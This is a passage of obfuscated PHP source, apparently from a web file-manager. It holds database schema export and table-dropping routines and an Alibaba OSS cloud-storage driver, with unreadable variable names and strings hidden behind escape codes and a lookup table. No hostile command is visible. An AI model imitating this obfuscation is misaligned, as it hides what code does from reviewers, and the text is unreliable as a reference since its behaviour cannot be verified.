$ÂßÉÒÓÇ = 0; $ÂàÑÇŞ = 0; if ($Àİíâ™«) { $²ª¼ÖŠ¤ = array($Àİíâ™«); $ÂßÉÒÓÇ = 1; $ÂàÑÇŞ = $ÔÀçæ†ï; } } } fclose($”ÒÜ—İñ); if (!empty($²ª¼ÖŠ¤)) { $Æ­‡İã = $í’œ›¥ . implode($ÛàŞÆ¬[60], $²ª¼ÖŠ¤); if (!$š¡¹½˜¥->execute($Æ­‡İã)) { return !1; } if ($²æÓÉıÉ) { $²æÓÉıÉ->update($ÂßÉÒÓÇ); } } return !0; } public function dropTable($œ™ÂÖñ  = null) { $ûâÏ­–€ = $this->model()->db(); $‘®˜éğ‘ = $œ™ÂÖñ  ? array($œ™ÂÖñ ) : $ûâÏ­–€->getTables(); if (!$‘®˜éğ‘) { return; } foreach ($‘®˜éğ‘ as $œ™ÂÖñ ) { if ($œ™ÂÖñ ) { $œ™ÂÖñ  = strtolower($œ™ÂÖñ ); } else { continue; } $ûâÏ­–€->execute("\144\x72\157\160\x20\x74\x61\x62\x6c\145\40\x69\x66\40\145\170\151\163\164\163\x20\140{$œ™ÂÖñ }\x60"); } } private function sqlEncode($ÂŸãÒ÷) { $«®Òó…¥ =& $_SERVER[¤·²È‰º]; $Õíâ‚à = array(); foreach ($ÂŸãÒ÷ as $ôõıŠ) { if (is_array($ôõıŠ)) { $ôõıŠ = json_encode_force($ôõıŠ); } $ôõıŠ = addslashes($ôõıŠ); $ôõıŠ = str_replace(array($«®Òó…¥[1072], $«®Òó…¥[18]), array($«®Òó…¥[1073], $«®Òó…¥[1074]), $ôõıŠ); $Õíâ‚à[] = str_replace($«®Òó…¥[68], $«®Òó…¥[1075], $ôõıŠ); } return $«®Òó…¥[68] . implode($«®Òó…¥[1076], $Õíâ‚à) . $«®Òó…¥[68]; } private function sqlDecode($ıœô£, $÷¯ø“÷æ, $©İÜµê· = '') { $®ºşè˜ =& $_SERVER[¤·²È‰º]; $ıœô£ = str_replace(array($®ºşè˜[1073], $®ºşè˜[1074]), array($®ºşè˜[1072], $®ºşè˜[18]), $ıœô£); if ($÷¯ø“÷æ == $®ºşè˜[23]) { return $©İÜµê· != $®ºşè˜[1077] ? stripslashes($ıœô£) : $ıœô£; } if ($©İÜµê· == $®ºşè˜[1077]) { $ıœô£ = str_replace($®ºşè˜[1078], $®ºşè˜[128], stripslashes($ıœô£)); } return $ıœô£; } public function getSqlFile($°„ø”³€ = '') { $šşïµßƒ =& $_SERVER[¤·²È‰º]; $±Í×Ô× = $this->dbType(!0); $¶·æˆ–Ñ = CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\x6c\57\144\141\x74\141\57{$±Í×Ô×}\56\x73\x71\154"; $šä¾Ä·« = file_get_contents($¶·æˆ–Ñ); $Œ¼ò¤Ü = $šşïµßƒ[1079] . ($±Í×Ô× == $šşïµßƒ[805] ? $šşïµßƒ[1080] : $šşïµßƒ[1081]) . $šşïµßƒ[1082]; preg_match_all($Œ¼ò¤Ü, $šä¾Ä·«, $ôæ¾€Ì); $õÊ›§ú  = $ôæ¾€Ì[1]; $ûÇØ×­Ô = $this->model()->db(); $‡©²°ÆÔ = $ûÇØ×­Ô->getTables(); $ÆÊÎìÁ = TEMP_FILES . $šşïµßƒ[1083] . date($šşïµßƒ[752]) . $šşïµßƒ[8]; del_dir($ÆÊÎìÁ); mk_dir($ÆÊÎìÁ); $¢´ˆ¯ñÍ = $ÆÊÎìÁ . $šşïµßƒ[1084]; $é£ñöûü = $ÆÊÎìÁ . $šşïµßƒ[1085]; $À‚¬ñ = $±Í×Ô× == $šşïµßƒ[23] ? $šşïµßƒ[805] : $šşïµßƒ[23]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\x61\154\154\x2f\x64\x61\164\x61\57{$À‚¬ñ}\x2e\163\161\154", $ÆÊÎìÁ); @touch($ÆÊÎìÁ . $±Í×Ô× . $šşïµßƒ[789]); $¬ÛÏììä = fopen($¢´ˆ¯ñÍ, $šşïµßƒ[1060]); $ê·øœìğ = fopen($é£ñöûü, $šşïµßƒ[1060]); if ($±Í×Ô× == $šşïµßƒ[23]) { $‡©²°ÆÔ = array_diff($‡©²°ÆÔ, array($šşïµßƒ[785], $šşïµßƒ[786])); $úßºúßù = array($šşïµßƒ[1086], $šşïµßƒ[1087], $šşïµßƒ[1088]); fwrite($ê·øœìğ, implode(PHP_EOL, $úßºúßù) . PHP_EOL . PHP_EOL); foreach ($‡©²°ÆÔ as $”’‹Ò˜õ) { $ì¡—â’ = $this->sqlFromSqlite($”’‹Ò˜õ); if (!$ì¡—â’[$šşïµßƒ[23]]) { continue; } fwrite($ê·øœìğ, $ì¡—â’[$šşïµßƒ[23]] . PHP_EOL . PHP_EOL); if (!in_array($”’‹Ò˜õ, $õÊ›§ú )) { fwrite($¬ÛÏììä, $ì¡—â’[$šşïµßƒ[805]] . PHP_EOL . PHP_EOL); } } } else { foreach ($‡©²°ÆÔ as $”’‹Ò˜õ) { $ì¡—â’ = $this->sqlFromMysql($”’‹Ò˜õ); if (!$ì¡—â’[$šşïµßƒ[805]]) { continue; } fwrite($¬ÛÏììä, $ì¡—â’[$šşïµßƒ[805]] . PHP_EOL . PHP_EOL); if (!in_array($”’‹Ò˜õ, $õÊ›§ú )) { fwrite($ê·øœìğ, $ì¡—â’[$šşïµßƒ[23]] . PHP_EOL . PHP_EOL); } } } fclose($¬ÛÏììä); fclose($ê·øœìğ); $šä¾Ä·« = array($šşïµßƒ[805] => $¢´ˆ¯ñÍ, $šşïµßƒ[23] => $é£ñöûü); return $°„ø”³€ ? $šä¾Ä·«[$°„ø”³€] : $šä¾Ä·«; } public function dbType($œ­ÊÒÄ = false) { $ÉÖÀè»† =& $_SERVER[¤·²È‰º]; $¡¤„ ĞÇ = $œ­ÊÒÄ ? $GLOBALS[$ÉÖÀè»†[6]][$ÉÖÀè»†[31]] : $this->database; $¡¤„ ĞÇ = array_change_key_case($¡¤„ ĞÇ); $ß‡èâ¥´ = $¡¤„ ĞÇ[$ÉÖÀè»†[961]]; if ($ß‡èâ¥´ == $ÉÖÀè»†[958]) { $Øø¥¢ñï = explode($ÉÖÀè»†[4], $¡¤„ ĞÇ[$ÉÖÀè»†[967]]); $ß‡èâ¥´ = $Øø¥¢ñï[0]; } $àûïãÀ” = array($ÉÖÀè»†[1089] => $ÉÖÀè»†[23], $ÉÖÀè»†[906] => $ÉÖÀè»†[805]); if (isset($àûïãÀ”[$ß‡èâ¥´])) { $ß‡èâ¥´ = $àûïãÀ”[$ß‡èâ¥´]; } return $ß‡èâ¥´; } public function sqlFromMysql($ß¶öö¼Ô, $”Ò­ú¼ã = '') { $ö¢òğ÷ó =& $_SERVER[¤·²È‰º]; $œçßâû = $this->model()->db(); $©¯ÏÄæÔ = $œçßâû->query($ö¢òğ÷ó[1090] . $ß¶öö¼Ô . $ö¢òğ÷ó[393]); if (!$©¯ÏÄæÔ || !$©¯ÏÄæÔ[0]) { return !1; } $¥ğ  îâ = _get($©¯ÏÄæÔ[0], $ö¢òğ÷ó[1091], $ö¢òğ÷ó[12]); if (!$¥ğ  îâ) { return !1; } $–¸€£îñ = "\104\122\117\x50\40\124\x41\x42\x4c\x45\40\x49\x46\40\x45\x58\111\123\x54\x53\40\140{$ß¶öö¼Ô}\140\x3b" . PHP_EOL . $¥ğ  îâ . $ö¢òğ÷ó[81]; if ($”Ò­ú¼ã && $”Ò­ú¼ã == $ö¢òğ÷ó[805]) { return $–¸€£îñ; } $ãã²œş¡ = array_change_key_case($GLOBALS[$ö¢òğ÷ó[6]][$ö¢òğ÷ó[31]]); $…±™¼¶“ = $ãã²œş¡[$ö¢òğ÷ó[966]]; $Èãâ°·œ = $ö¢òğ÷ó[1092] . $…±™¼¶“ . $ö¢òğ÷ó[1093] . $ß¶öö¼Ô . $ö¢òğ÷ó[68]; $Ëşõ”Ì· = $ö¢òğ÷ó[1094] . $ß¶öö¼Ô . $ö¢òğ÷ó[894]; $ë¿‘ÓŒ = $œçßâû->query($Èãâ°·œ); if (empty($ë¿‘ÓŒ)) { $¸Û»˜ÍÄ = array($ö¢òğ÷ó[805] => $ö¢òğ÷ó[12], $ö¢òğ÷ó[23] => $ö¢òğ÷ó[12]); return $”Ò­ú¼ã ? $¸Û»˜ÍÄ[$”Ò­ú¼ã] : $¸Û»˜ÍÄ; } $Œ—Ÿ ¶‰ = $œçßâû->query($Ëşõ”Ì·); $üàºûã = $ö¢òğ÷ó[12]; $¥½Ç®°¤ = array(); foreach ($Œ—Ÿ ¶‰ as $”Ã™½êÓ) { if (!$üàºûã && $”Ã™½êÓ[$ö¢òğ÷ó[1095]] == $ö¢òğ÷ó[1096]) { $üàºûã = $”Ã™½êÓ[$ö¢òğ÷ó[1097]]; } if (isset($¥½Ç®°¤[$”Ã™½êÓ[$ö¢òğ÷ó[1095]]])) { $¥½Ç®°¤[$”Ã™½êÓ[$ö¢òğ÷ó[1095]]][$ö¢òğ÷ó[1098]][] = $”Ã™½êÓ[$ö¢òğ÷ó[1097]]; continue; } $¥½Ç®°¤[$”Ã™½êÓ[$ö¢òğ÷ó[1095]]] = array($ö¢òğ÷ó[1099] => $”Ã™½êÓ[$ö¢òğ÷ó[1095]], $ö¢òğ÷ó[1098] => array($”Ã™½êÓ[$ö¢òğ÷ó[1097]]), $ö¢òğ÷ó[1100] => $”Ã™½êÓ[$ö¢òğ÷ó[1101]] == $ö¢òğ÷ó[98] ? 0 : 1); } $º¾Ö¬¶Ä = array(); foreach ($¥½Ç®°¤ as $”Ã™½êÓ) { $¿ëş‹ø¡ = $”Ã™½êÓ[$ö¢òğ÷ó[1099]] == $ö¢òğ÷ó[1096]; $¹ßŠÕš½ = array($ö¢òğ÷ó[1102], $”Ã™½êÓ[$ö¢òğ÷ó[1100]] == $ö¢òğ÷ó[98] && !$¿ëş‹ø¡ ? $ö¢òğ÷ó[1103] : $ö¢òğ÷ó[12], $ö¢òğ÷ó[1104], $ö¢òğ÷ó[1105] . $ß¶öö¼Ô . $ö¢òğ÷ó[11] . ($¿ëş‹ø¡ ? $ö¢òğ÷ó[1106] : $”Ã™½êÓ[$ö¢òğ÷ó[1099]]) . $ö¢òğ÷ó[128], $ö¢òğ÷ó[1107], $ö¢òğ÷ó[128] . $ß¶öö¼Ô . $ö¢òğ÷ó[128], $ö¢òğ÷ó[1108] . implode($ö¢òğ÷ó[1109], $”Ã™½êÓ[$ö¢òğ÷ó[1098]]) . $ö¢òğ÷ó[1110]); $º¾Ö¬¶Ä[] = implode($ö¢òğ÷ó[63], $¹ßŠÕš½) . $ö¢òğ÷ó[81]; } $ÔçÖ×•¡ = array(); $Ò¼ØËÛÌ = array($ö¢òğ÷ó[1111] => $ö¢òğ÷ó[1112], $ö¢òğ÷ó[1112] => $ö¢òğ÷ó[1112], $ö¢òğ÷ó[297] => $ö¢òğ÷ó[324], $ö¢òğ÷ó[296] => $ö¢òğ÷ó[324]); foreach ($ë¿‘ÓŒ as $”Ã™½êÓ) { $¹ßŠÕš½ = array($ö¢òğ÷ó[128] . $”Ã™½êÓ[$ö¢òğ÷ó[1113]] . $ö¢òğ÷ó[128], isset($Ò¼ØËÛÌ[$”Ã™½êÓ[$ö¢òğ÷ó[1114]]]) ? $Ò¼ØËÛÌ[$”Ã™½êÓ[$ö¢òğ÷ó[1114]]] : $”Ã™½êÓ[$ö¢òğ÷ó[1115]], $”Ã™½êÓ[$ö¢òğ÷ó[1116]] == $ö¢òğ÷ó[892] ? $ö¢òğ÷ó[1117] : $ö¢òğ÷ó[1118], $”Ã™½êÓ[$ö¢òğ÷ó[1113]] == $üàºûã ? $ö¢òğ÷ó[1119] : $ö¢òğ÷ó[12], $”Ã™½êÓ[$ö¢òğ÷ó[943]] ? strtoupper(str_replace($ö¢òğ÷ó[11], $ö¢òğ÷ó[12], $”Ã™½êÓ[$ö¢òğ÷ó[943]])) : $ö¢òğ÷ó[12]); $ÔçÖ×•¡[] = trim(implode($ö¢òğ÷ó[63], $¹ßŠÕš½)); } $Â‡ê•Ïú = array($ö¢òğ÷ó[1120] . $ß¶öö¼Ô . $ö¢òğ÷ó[1121], $ö¢òğ÷ó[1122] . $ß¶öö¼Ô . $ö¢òğ÷ó[1123], implode($ö¢òğ÷ó[60] . PHP_EOL, $ÔçÖ×•¡), $ö¢òğ÷ó[940]); $İ¹¼Æ·Û = implode(PHP_EOL, array_merge($Â‡ê•Ïú, $º¾Ö¬¶Ä)); if ($”Ò­ú¼ã && $”Ò­ú¼ã == $ö¢òğ÷ó[23]) { return $İ¹¼Æ·Û; } $¸Û»˜ÍÄ = array($ö¢òğ÷ó[805] => $–¸€£îñ, $ö¢òğ÷ó[23] => $İ¹¼Æ·Û); return $”Ò­ú¼ã ? $¸Û»˜ÍÄ[$”Ò­ú¼ã] : $¸Û»˜ÍÄ; } public function sqlFromSqlite($Œ™Í¸», $äûıÒ¥ = '') { $¶‰Ô¥Ë¬ =& $_SERVER[¤·²È‰º]; $ô™ÆÇ¾ƒ = $this->model()->db(); $‚”Ó‹Úí = "\x50\122\x41\x47\x4d\x41\x20\124\x41\102\x4c\105\x5f\111\x4e\106\117\x20\50\x27{$Œ™Í¸»}\47\x29"; $ˆÄê¸ = "\x53\x45\x4c\105\x43\124\x20\x2a\40\106\122\117\x4d\40\x73\x71\x6c\151\164\145\x5f\155\141\163\x74\x65\x72\40\127\110\105\x52\x45\40\x74\142\x6c\137\x6e\141\155\145\40\x3d\40\47{$Œ™Í¸»}\x27"; $¨Âéğœ = $ô™ÆÇ¾ƒ->query($‚”Ó‹Úí); if (empty($¨Âéğœ)) { $ãƒâÀ = array($¶‰Ô¥Ë¬[805] => $¶‰Ô¥Ë¬[12], $¶‰Ô¥Ë¬[23] => $¶‰Ô¥Ë¬[12]); return $äûıÒ¥ ? $ãƒâÀ[$äûıÒ¥] : $ãƒâÀ; } $¹ø”»Ó = $ô™ÆÇ¾ƒ->query($ˆÄê¸); $¿ƒĞİò¾ = $ óà“¨´ = array(); foreach ($¹ø”»Ó as $ë‚®¾‹ƒ) { if ($ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[43]] == $¶‰Ô¥Ë¬[288]) { $¿ƒĞİò¾[] = $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[1124]]; } else { $ óà“¨´[$ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[42]]] = $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[1124]]; } } $Ë…¼¤Ó = array_merge(array($¶‰Ô¥Ë¬[1120] . $Œ™Í¸» . $¶‰Ô¥Ë¬[128]), $¿ƒĞİò¾, array_values($ óà“¨´)); $Ë…¼¤Ó = implode($¶‰Ô¥Ë¬[81] . PHP_EOL, $Ë…¼¤Ó) . $¶‰Ô¥Ë¬[81]; if ($äûıÒ¥ && $äûıÒ¥ == $¶‰Ô¥Ë¬[23]) { return $Ë…¼¤Ó; } $Ê¶”Ó°ó = array(); $‰ƒøø® = array($¶‰Ô¥Ë¬[1112] => $¶‰Ô¥Ë¬[1125], $¶‰Ô¥Ë¬[324] => $¶‰Ô¥Ë¬[1126]); $Ü£ıƒ§î = $¶‰Ô¥Ë¬[12]; foreach ($¨Âéğœ as $ë‚®¾‹ƒ) { if ($ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[67]] == $¶‰Ô¥Ë¬[98]) { $Ü£ıƒ§î = $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[42]]; } $ËÏ’õ‘¢ = array($¶‰Ô¥Ë¬[393] . $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[42]] . $¶‰Ô¥Ë¬[393], isset($‰ƒøø®[$ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[43]]]) ? $‰ƒøø®[$ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[43]]] : $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[43]], $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[45]] == $¶‰Ô¥Ë¬[98] ? $¶‰Ô¥Ë¬[1117] : $¶‰Ô¥Ë¬[1127] . $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[66]], $ë‚®¾‹ƒ[$¶‰Ô¥Ë¬[67]] == $¶‰Ô¥Ë¬[98] ? $¶‰Ô¥Ë¬[1128] : $¶‰Ô¥Ë¬[12]); $Ê¶”Ó°ó[] = trim(implode($¶‰Ô¥Ë¬[63], $ËÏ’õ‘¢)); } foreach ($ óà“¨´ as $Ÿáó¢Ñ => $ÎãÅ ²) { $ÖÚˆ˜Õ = str_replace($¶‰Ô¥Ë¬[1129] . $Œ™Í¸» . $¶‰Ô¥Ë¬[11], $¶‰Ô¥Ë¬[12], $Ÿáó¢Ñ); $ÔÌĞûÛç = str_replace(array($¶‰Ô¥Ë¬[128], $¶‰Ô¥Ë¬[951]), $¶‰Ô¥Ë¬[393], substr($ÎãÅ ², stripos($ÎãÅ ², $¶‰Ô¥Ë¬[269]))); if ($ÖÚˆ˜Õ == $¶‰Ô¥Ë¬[1106]) { $›Ãğ¾‰ = $¶‰Ô¥Ë¬[1130] . $Ü£ıƒ§î . $¶‰Ô¥Ë¬[1131]; } else { $›Ãğ¾‰ = (stripos($ÖÚˆ˜Õ, $¶‰Ô¥Ë¬[11]) ? $¶‰Ô¥Ë¬[1132] : $¶‰Ô¥Ë¬[12]) . ($¶‰Ô¥Ë¬[1133] . $ÖÚˆ˜Õ . $¶‰Ô¥Ë¬[1134] . $ÔÌĞûÛç); } $Ê¶”Ó°ó[] = $›Ãğ¾‰; } $°‹÷Ã¨Ø = array($¶‰Ô¥Ë¬[1135] . $Œ™Í¸» . $¶‰Ô¥Ë¬[1136], $¶‰Ô¥Ë¬[1137] . $Œ™Í¸» . $¶‰Ô¥Ë¬[1138], implode($¶‰Ô¥Ë¬[60] . PHP_EOL, $Ê¶”Ó°ó), $¶‰Ô¥Ë¬[1139]); $æ²à‹óé = implode(PHP_EOL, $°‹÷Ã¨Ø); if ($äûıÒ¥ && $äûıÒ¥ == $¶‰Ô¥Ë¬[805]) { return $æ²à‹óé; } $ãƒâÀ = array($¶‰Ô¥Ë¬[805] => $æ²à‹óé, $¶‰Ô¥Ë¬[23] => $Ë…¼¤Ó); return $äûıÒ¥ ? $ãƒâÀ[$äûıÒ¥] : $ãƒâÀ; } } goto AÄ‹ªæ¿æ; a´á¡İÛøÉ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($ä»…Í½Ó) { parent::__construct(); include_once SDK_DIR . $_SERVER[¤·²È‰º][1376]; $this->_init($ä»…Í½Ó); } public function _init($àõœÄİÇ) { $‹ŞÁ½¸ =& $_SERVER[¤·²È‰º]; foreach ($àõœÄİÇ as $™‰œœı½ => $˜ıÄõƒ¨) { if (isset($this->{$™‰œœı½})) { $this->{$™‰œœı½} = $˜ıÄõƒ¨; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‹ŞÁ½¸[1377] . LNG($‹ŞÁ½¸[1378])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Á†ÎŠ¨İ =& $_SERVER[¤·²È‰º]; $Œ¦§ùª¢ = new OSS\Model\CorsConfig(); $·¦¹†Ö = new OSS\Model\CorsRule(); $·¦¹†Ö->addAllowedOrigin($Á†ÎŠ¨İ[1379]); $·¦¹†Ö->addAllowedMethod($Á†ÎŠ¨İ[1380]); $·¦¹†Ö->addAllowedMethod($Á†ÎŠ¨İ[1381]); $·¦¹†Ö->addAllowedMethod($Á†ÎŠ¨İ[1382]); $·¦¹†Ö->addAllowedMethod($Á†ÎŠ¨İ[1383]); $·¦¹†Ö->addAllowedMethod($Á†ÎŠ¨İ[170]); $·¦¹†Ö->setMaxAgeSeconds(600); $·¦¹†Ö->addExposeHeader($Á†ÎŠ¨İ[1384]); $·¦¹†Ö->addAllowedHeader($Á†ÎŠ¨İ[1379]); $Œ¦§ùª¢->addRule($·¦¹†Ö); try { $this->client->putBucketCors($this->bucket, $Œ¦§ùª¢); } catch (OSS\Core\OssException $Ö­ñõàË) { return !1; } return !0; } public function getBucketCors() { $Á…â¹± =& $_SERVER[¤·²È‰º]; $İ²îÌ‡ö = null; try { $İ²îÌ‡ö = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ªæ›Àâ) { return null; } if (!$İ²îÌ‡ö || !($êçÌ¶û‰ = $İ²îÌ‡ö->getRules())) { return null; } $çÜ²áÇ— = $êçÌ¶û‰[0]->getAllowedOrigins(); $©å®è¡ = $êçÌ¶û‰[0]->getAllowedMethods(); $õÀ‚âì¥ = $êçÌ¶û‰[0]->getMaxAgeSeconds(); $¸ÑÓéÏò = $êçÌ¶û‰[0]->getExposeHeaders(); $½¹´èãé = $êçÌ¶û‰[0]->getAllowedHeaders(); return array($Á…â¹±[197] => isset($çÜ²áÇ—[0]) ? $çÜ²áÇ—[0] : $Á…â¹±[12], $Á…â¹±[201] => $©å®è¡, $Á…â¹±[1385] => $õÀ‚âì¥, $Á…â¹±[1386] => isset($¸ÑÓéÏò[0]) ? $¸ÑÓéÏò[0] : $Á…â¹±[12], $Á…â¹±[199] => isset($½¹´èãé[0]) ? $½¹´èãé[0] : $Á…â¹±[12]); } public function isBucketCors() { $¿Á ø°³ =& $_SERVER[¤·²È‰º]; $ÆÔ³æºê = $this->getBucketCors(); if (!$ÆÔ³æºê || !is_array($ÆÔ³æºê)) { return !1; } if ($ÆÔ³æºê[$¿Á ø°³[197]] != $¿Á ø°³[198] || $ÆÔ³æºê[$¿Á ø°³[199]] != $¿Á ø°³[198]) { return !1; } $äì‹Ø÷… = array_map($¿Á ø°³[200], $ÆÔ³æºê[$¿Á ø°³[201]]); if (!is_array($äì‹Ø÷…)) { $äì‹Ø÷… = array(); } $”€İÅ­Œ = array($¿Á ø°³[202], $¿Á ø°³[203], $¿Á ø°³[204], $¿Á ø°³[205], $¿Á ø°³[206]); $öø›‰ùí = array_diff($”€İÅ­Œ, $äì‹Ø÷…); return empty($öø›‰ùí); } public function mkfile($–Â·‚™ê, $†Â¢×€Ü = '', $Ü­ìŒ = REPEAT_RENAME) { $ëÓºÜ£ = $this->setContent($–Â·‚™ê, $†Â¢×€Ü); if ($ëÓºÜ£ !== !1) { return $this->getPathOuter($–Â·‚™ê); } return !1; } public function mkdir($”“ ‡±Ò, $¥»€ƒáâ = REPEAT_SKIP) { if ($¥»€ƒáâ && $this->_isFolder($”“ ‡±Ò)) { return $this->getPathOuter($”“ ‡±Ò); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($”“ ‡±Ò)); } catch (OSS\Core\OssException $ĞõÃï¦ü) { return !1; } return $this->getPathOuter($”“ ‡±Ò); } private function fileList($„”–øË, $ÖìŒ¥³ = '', $Ò²Ïâº› = 0) { $ŸŸËË… =& $_SERVER[¤·²È‰º]; $„”–øË = trim($„”–øË, $ŸŸËË…[8]); $¢•õ«èÉ = empty($„”–øË) && $„”–øË !== $ŸŸËË…[207] ? $ŸŸËË…[12] : $„”–øË . $ŸŸËË…[8]; $ïñÛ™øï = $ŸŸËË…[12]; $Ñ²äç…ö = 1000; $‹‘£®ÑÜ = $Ù¹°Î­Ç = array(); while (!0) { check_abort(); $ëşöŸá½ = array($ŸŸËË…[1387] => $ÖìŒ¥³, $ŸŸËË…[1388] => $¢•õ«èÉ, $ŸŸËË…[1389] => $Ñ²äç…ö, $ŸŸËË…[1390] => $ïñÛ™øï); try { $è¸‹èâ‡ = $this->client->listObjects($this->bucket, $ëşöŸá½); } catch (OSS\Core\OssException $Á…Íò¾Ğ) { break; } $ïñÛ™øï = $è¸‹èâ‡->getNextMarker(); $¡Îæ€á¶ = $è¸‹èâ‡->getObjectList(); $¹¯¿Ÿ‚ = $è¸‹èâ‡->getPrefixList(); foreach ($¡Îæ€á¶ as $œ®¾©²ı) { if ($œ®¾©²ı->getKey() == $¢•õ«èÉ) { continue; } $à‘òÆÁ£ = $œ®¾©²ı->getKey(); $àö½«ê¢ = $œ®¾©²ı->getSize(); $Œ‹ùÄÉ¬ = $œ®¾©²ı->getLastModified(); $ªÔîÁáÃ = $Ò²Ïâº› ? array($ŸŸËË…[42] => $à‘òÆÁ£, $ŸŸËË…[86] => $àö½«ê¢, $ŸŸËË…[213] => strtotime($Œ‹ùÄÉ¬)) : $à‘òÆÁ£; $ˆ°ĞÅ–Æ = $àö½«ê¢ == 0 && substr($à‘òÆÁ£, strlen($à‘òÆÁ£) - 1, 1) == $ŸŸËË…[8] ? !0 : !1; $†ŸÜ¦„¨ = array($ŸŸËË…[86] => $àö½«ê¢, $ŸŸËË…[1391] => $àö½«ê¢, $ŸŸËË…[95] => strtotime($Œ‹ùÄÉ¬), $ŸŸËË…[1392] => $Œ‹ùÄÉ¬); $this->cacheMethodInfoSet($à‘òÆÁ£, $ˆ°ĞÅ–Æ, $†ŸÜ¦„¨); if ($ˆ°ĞÅ–Æ) { $‹‘£®ÑÜ[] = $à‘òÆÁ£; continue; } $Ù¹°Î­Ç[] = $ªÔîÁáÃ; } foreach ($¹¯¿Ÿ‚ as $çØÅø¿) { $‹‘£®ÑÜ[] = $çØÅø¿->getPrefix(); $this->cacheMethodInfoSet($çØÅø¿->getPrefix(), !0); } if ($ïñÛ™øï === $ŸŸËË…[12]) { break; } } $this->cacheMethodInfoSet($„”–øË, !0); return array($ŸŸËË…[92] => $‹‘£®ÑÜ, $ŸŸËË…[93] => $Ù¹°Î­Ç); } public function copyFile($Ú´ñı÷—, $´ş»“Êè) { $ÇÌ„Í› = $this->size($Ú´ñı÷—); if ($ÇÌ„Í› < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ú´ñı÷—, $this->bucket, $this->pathEncode($´ş»“Êè)); } catch (OSS\Core\OssException $Í³£ï¶Ø) { return !1; } return $this->getPathOuter($´ş»“Êè); } $ÅîÁ¥Í = $this->multiCopyObject($Ú´ñı÷—, $´ş»“Êè, $ÇÌ„Í›); return $ÅîÁ¥Í ? $this->getPathOuter($´ş»“Êè) : !1; } private function multiCopyObject($£¦“úşå, $Ö†ÀÉË‰, $éÓÜâÙ) { $ù•º¨îË =& $_SERVER[¤·²È‰º]; try { $¿Çå’íÀ = array(); if ($úÏ€¯Š = $this->hashMd5($£¦“úşå)) { $¿Çå’íÀ = array(OSS\OssClient::OSS_HEADERS => array($ù•º¨îË[1393] => $úÏ€¯Š)); } $ÙèÖğƒˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ö†ÀÉË‰), $¿Çå’íÀ); $¸­ä–¬ = 1; $·¦èµ£ = 0; $‰ÍúÍ­Û = array(); $çöÅ°•Ø = 1024 * 1024 * 10; $‹ä½Ù–Ê = $this->client->generateMultiuploadParts($éÓÜâÙ, $çöÅ°•Ø); foreach ($‹ä½Ù–Ê as $­öÈÜÚî => $¬Ë“ÄŞÔ) { $ŞÎ¬Æ·‚ = $·¦èµ£ + (int) $¬Ë“ÄŞÔ[$ù•º¨îË[1394]]; $àÕÀÎß± = (int) $¬Ë“ÄŞÔ[$ù•º¨îË[346]] + $ŞÎ¬Æ·‚ - 1; $Õ»¢×ëë = array($ù•º¨îË[1395] => $ŞÎ¬Æ·‚, $ù•º¨îË[1396] => $àÕÀÎß±); $‰ÍúÍ­Û[] = $this->client->uploadPartCopy($this->bucket, $£¦“úşå, $this->bucket, $this->pathEncode($Ö†ÀÉË‰), $¸­ä–¬, $ÙèÖğƒˆ, $Õ»¢×ëë); $¸­ä–¬ = $¸­ä–¬ + 1; } $ÆáÊÖÏí = array(); foreach ($‰ÍúÍ­Û as $­öÈÜÚî => $”Ô’½á) { $ÆáÊÖÏí[] = array($ù•º¨îË[1397] => $­öÈÜÚî + 1, $ù•º¨îË[1398] => $”Ô’½á); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ö†ÀÉË‰), $ÙèÖğƒˆ, $ÆáÊÖÏí); } catch (OSS\Core\OssException $ˆâŞ¹öœ) { return !1; } return !0; } public function moveFile($£¡Î¹€³, $î÷Í¸) { if ($this->copyFile($£¡Î¹€³, $î÷Í¸)) { $this->remove($£¡Î¹€³); return $this->getPathOuter($î÷Í¸); } return !1; } public function delFile($Å½ç²¨œ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Å½ç²¨œ)); } catch (OSS\Core\OssException $ûâî‹Å”) { return !1; } return !0; } public function delFolder($Æµ˜Ğı) { $¼Ú§³µ‡ =& $_SERVER[¤·²È‰º]; if (!$this->exist($Æµ˜Ğı)) { return !0; } $this->listItemCache = !1; $Ë—ÄºŒ¾ = $this->fileList($Æµ˜Ğı); $this->listItemCache = !0; $Ñ‹ó÷Šƒ = trim($Æµ˜Ğı, $¼Ú§³µ‡[8]) . $¼Ú§³µ‡[8]; if (!empty($Æµ˜Ğı) && $Æµ˜Ğı !== $¼Ú§³µ‡[207] && !in_array($Ñ‹ó÷Šƒ, $Ë—ÄºŒ¾[$¼Ú§³µ‡[92]])) { $Ë—ÄºŒ¾[$¼Ú§³µ‡[92]][] = $Ñ‹ó÷Šƒ; } $Û¡ñŠ ò = $this->delByBatch($Ë—ÄºŒ¾[$¼Ú§³µ‡[93]]); if (!$Û¡ñŠ ò) { return !1; } $Û¡ñŠ ò = $this->delByBatch($Ë—ÄºŒ¾[$¼Ú§³µ‡[92]]); if (!$Û¡ñŠ ò) { return !1; } return $this->delFile($Ñ‹ó÷Šƒ); } private function delByBatch($«ß²Ù¯Š) { foreach (array_chunk($«ß²Ù¯Š, 1000) as 